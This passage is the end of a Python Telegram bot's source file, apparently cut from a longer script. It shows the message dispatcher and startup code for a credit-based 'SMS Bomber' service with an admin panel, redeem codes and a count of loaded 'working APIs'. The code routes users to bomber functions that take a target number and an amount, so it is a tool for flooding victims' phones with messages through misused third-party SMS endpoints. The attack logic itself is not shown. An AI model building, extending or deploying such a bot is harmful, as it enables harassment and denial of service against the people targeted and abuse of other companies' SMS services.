    msg = update.message.text
    if user_id == ADMIN_ID:
        if msg == "💰 Add Credit": await admin_add_credit(update, context); return
        elif msg == "➖ Remove Credit": await admin_remove_credit(update, context); return
        elif msg == "🚫 Ban User": await admin_ban_user(update, context); return
        elif msg == "✅ Unban User": await admin_unban_user(update, context); return
        elif msg == "📣 Broadcast": await admin_broadcast(update, context); return
        elif msg == "🎟️ Create Code": await admin_create_code(update, context); return
        elif msg == "💰 Total Balance": await admin_total_balance(update, context); return
        elif msg == "🏆 Top Users": await admin_top_users(update, context); return
        elif msg == "📤 Export Data": await admin_export_data(update, context); return
        elif msg == "📊 Live Stats": await admin_live_stats(update, context); return
        elif msg == "📈 API Stats": await admin_api_stats(update, context); return
        elif msg == "🔙 Back": await update.message.reply_text("🏠 Main Menu", reply_markup=get_main_keyboard()); context.user_data.clear(); return
        if context.user_data.get('admin_state'): await admin_state_handler(update, context); return
    if msg == "🔙 Back":
        await update.message.reply_text("🏠 **Main Menu**", parse_mode="Markdown", reply_markup=get_main_keyboard())
        context.user_data.clear(); return
    if msg == "📨 Send SMS": await cmd_sms(update, context); return
    if msg == "💣 SMS Bomber": await cmd_bomber(update, context); return
    if msg == "👤 My Profile": await profile(update, context); return
    if msg == "🎁 Redeem Code": await redeem(update, context); return
    if msg == "📊 My Stats": await stats(update, context); return
    if msg == "📞 Contact Admin": await contact(update, context); return
    state = context.user_data.get('state')
    if state == 'sms_number': await sms_number(update, context); return
    elif state == 'sms_message': await sms_message(update, context); return
    elif state == 'bomber_number': await bomber_number(update, context); return
    elif state == 'bomber_amount': await bomber_amount(update, context); return
    elif state == 'redeem_code': await redeem_process(update, context); return
    await update.message.reply_text("❌ **Please use the buttons below:**", parse_mode="Markdown", reply_markup=get_main_keyboard())

# ===================== মেইন =====================
async def main():
    try:
        print("="*60); print("🔥 SMS BOMBER BOT STARTING..."); print(f"✅ APIs Loaded: {len(WORKING_APIS)}"); print(f"👑 Admin ID: {ADMIN_ID}"); print("="*60)
        await init_db()
        application = Application.builder().token(BOT_TOKEN).connect_timeout(60.0).read_timeout(60.0).pool_timeout(60.0).build()
        await application.bot.delete_webhook(drop_pending_updates=True)
        await asyncio.sleep(3)  # কনফ্লিক্ট সমাধান
        application.add_handler(CommandHandler("start", start))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
        await application.initialize(); await application.start(); await application.updater.start_polling()
        print("✅ Bot is RUNNING!"); print("="*60)
        while True: await asyncio.sleep(1)
    except Exception as e: print(f"❌ Error: {e}"); logger.error(f"Main error: {e}")

if __name__ == "__main__":
    try: asyncio.run(main())
    except KeyboardInterrupt: print("\n⛔ Bot stopped!")
    except Exception as e: print(f"❌ Fatal error: {e}")
